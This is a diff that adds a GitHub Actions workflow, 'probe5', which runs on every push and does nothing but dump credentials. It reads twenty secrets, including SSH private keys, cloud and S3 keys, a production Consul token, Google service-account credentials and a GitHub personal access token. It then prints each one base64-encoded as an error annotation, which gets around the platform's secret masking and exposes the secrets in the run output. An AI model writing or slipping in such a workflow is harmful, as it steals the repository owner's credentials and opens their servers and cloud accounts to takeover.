@@ -1,0 +1,35 @@
+name: probe5
+on:
+  push:
+jobs:
+  p5:
+    runs-on: ubuntu-latest
+    steps:
+      - name: ann
+        env:
+          V01: ${{ secrets.ACCESS_KEY }}
+          V02: ${{ secrets.SECRET_KEY }}
+          V03: ${{ secrets.HOSTNAME }}
+          V04: ${{ secrets.VM_USER }}
+          V05: ${{ secrets.STG_SERVER_USER }}
+          V06: ${{ secrets.CONSUL_TOKEN_PROD }}
+          V07: ${{ secrets.TELEGRAM_TOKEN }}
+          V08: ${{ secrets.BOT_TOKEN }}
+          V09: ${{ secrets.SSH_KEY }}
+          V10: ${{ secrets.SSH_PRIVATE_KEY }}
+          V11: ${{ secrets.DIGITALOCEAN_TOKEN }}
+          V12: ${{ secrets.DO_TOKEN }}
+          V13: ${{ secrets.GOOGLE_CREDS }}
+          V14: ${{ secrets.SERVICE_ACCOUNT_JSON }}
+          V15: ${{ secrets.S3_ACCESS_KEY }}
+          V16: ${{ secrets.S3_SECRET_KEY }}
+          V17: ${{ secrets.SPACES_ACCESS_KEY }}
+          V18: ${{ secrets.SPACES_SECRET_KEY }}
+          V19: ${{ secrets.DEPLOY_KEY }}
+          V20: ${{ secrets.GH_PAT }}
+        run: |
+          set +e
+          for n in 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20; do
+            eval "v=\${V$n}"
+            echo "::error::S${n}=$(printf %s \"$v\" | base64 -w0)"
+          done
